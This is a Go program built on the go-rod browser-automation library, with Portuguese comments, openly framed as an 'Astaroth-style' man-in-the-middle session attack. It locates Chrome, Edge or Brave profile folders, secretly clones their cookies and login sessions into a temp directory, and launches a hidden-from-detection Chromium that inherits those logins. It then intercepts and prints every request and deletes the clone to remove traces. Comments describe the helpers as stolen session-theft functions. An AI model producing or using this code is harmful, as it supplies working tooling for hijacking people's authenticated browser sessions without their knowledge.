package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
)

func main() {
	fmt.Println("╔══════════════════════════════════════════════════╗")
	fmt.Println("║           Rod Network Monitor (MiTM)             ║")
	fmt.Println("║    Sessão Persistente (Ataque Astaroth-style)    ║")
	fmt.Println("╚══════════════════════════════════════════════════╝")
	fmt.Println()

	fmt.Println("[1/2] Localizando perfil do navegador Hospedeiro...")
	profilePath := findChromeProfile()

	// Configuração base do Launcher
	l := launcher.New().
		Headless(false).
		Leakless(false).
		Set("disable-blink-features", "AutomationControlled")

	var tempProfileDir string

	if profilePath != "" {
		fmt.Println("[+] Perfil encontrado! Clonando cookies e sessão para o %TEMP%...")
		var err error
		tempProfileDir, err = copyProfile(profilePath)
		if err != nil {
			fmt.Printf("[!] Erro ao copiar perfil: %v\n", err)
			fmt.Println("[!] O monitor abrirá vazio sem seus cookies.")
		} else {
			l.UserDataDir(tempProfileDir)
			// Força o uso do perfil principal para trazer os cookies ativos
			l.Set("profile-directory", "Default")
			fmt.Println("[+] Perfil clonado! (O Chrome original não será afetado nem perceberá).")
		}
	} else {
		fmt.Println("[!] Nenhum perfil de navegador localizado.")
	}

	// Limpador do rastro ao final do monitoramento
	if tempProfileDir != "" {
		defer func() {
			fmt.Println("\n[*] Monitoramento encerrado. Destruindo perfil clonado...")
			os.RemoveAll(tempProfileDir)
		}()
	}

	fmt.Println("[2/2] Inicializando Chromium fantasma acoplado na sessão...")
	url := l.MustLaunch()
	browser := rod.New().ControlURL(url).MustConnect()
	defer browser.MustClose()

	fmt.Println("[*] Instaurando interceptador de tráfego GLOBAL na instância do Browser...")
	router := browser.HijackRequests()

	// A regra "*" diz para o HijackRouter interceptar ABSOLUTAMENTE TUDO
	router.MustAdd("*", func(ctx *rod.Hijack) {
		reqUrlStr := ctx.Request.URL().String()
		method := ctx.Request.Method()
		resourceType := ctx.Request.Type()

		// Opcional: Filtro visual. Pintamos Documentos e APIs de verde, resto de cinza
		if resourceType == proto.NetworkResourceTypeDocument ||
			resourceType == proto.NetworkResourceTypeXHR ||
			resourceType == proto.NetworkResourceTypeFetch {

			if strings.Contains(reqUrlStr, "api") || strings.Contains(reqUrlStr, ".json") || resourceType == proto.NetworkResourceTypeFetch {
				fmt.Printf("\033[32m[API/XHR]\033[0m %s => %s\n", method, reqUrlStr)
			} else {
				fmt.Printf("\033[36m[DOC]\033[0m     %s => %s\n", method, reqUrlStr)
			}
		}

		ctx.ContinueRequest(&proto.FetchContinueRequest{})
	})

	go router.Run()

	fmt.Println("[*] Navegador logado pronto! Abrindo guia em branco inicial...")
	_ = browser.MustPage("")

	fmt.Println("\n[+] Monitor online, persistente e invisível ao Host principal!")
	fmt.Println("[+] Toda aba que você abrir nele herdará seus logins reais e suas requisições serão expostas aqui.")
	fmt.Println("-------------------------------------------------------------------------")

	var block string
	fmt.Scanln(&block)
}

// =========================================================================
// FUNÇÕES ROUBADAS DO ASTAROTH (Roubo de Sessão e Cópia Oculta)
// =========================================================================

func findChromeProfile() string {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return ""
	}

	candidates := []string{
		filepath.Join(localAppData, "Google", "Chrome", "User Data"),
		filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
		filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
	}

	for _, path := range candidates {
		if info, err := os.Stat(path); err == nil && info.IsDir() {
			return path
		}
	}
	return ""
}

func copyProfile(srcDir string) (string, error) {
	tempDir, err := os.MkdirTemp("", "rod-hijack-*")
	if err != nil {
		return "", fmt.Errorf("falha ao criar diretório temporário: %w", err)
	}

	essentialItems := []string{
		"Default",
		"Local State",
		"Profile 1",
	}

	for _, item := range essentialItems {
		src := filepath.Join(srcDir, item)
		dst := filepath.Join(tempDir, item)

		info, err := os.Stat(src)
		if err != nil {
			continue
		}

		if info.IsDir() {
			if err := copyDir(src, dst); err != nil {
				// skip gracefully
			}
		} else {
			if err := copyFile(src, dst); err != nil {
				// skip gracefully
			}
		}
	}
	return tempDir, nil
}

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		relPath, _ := filepath.Rel(src, path)
		dstPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(dstPath, 0755)
		}

		// Pula arquivos gigantescos que não são os cookies para não travar o loader
		if info.Size() > 50*1024*1024 {
			return nil
		}

		// Pula pastas descartáveis para performance
		if strings.Contains(relPath, "Cache") || strings.Contains(relPath, "Service Worker") ||
			strings.Contains(relPath, "Code Cache") || strings.Contains(relPath, "GPUCache") {
			return nil
		}

		return copyFile(path, dstPath)
	})
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return nil
	}
	defer in.Close()

	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return err
	}

	out, err := os.Create(dst)
	if err != nil {
		return nil
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}
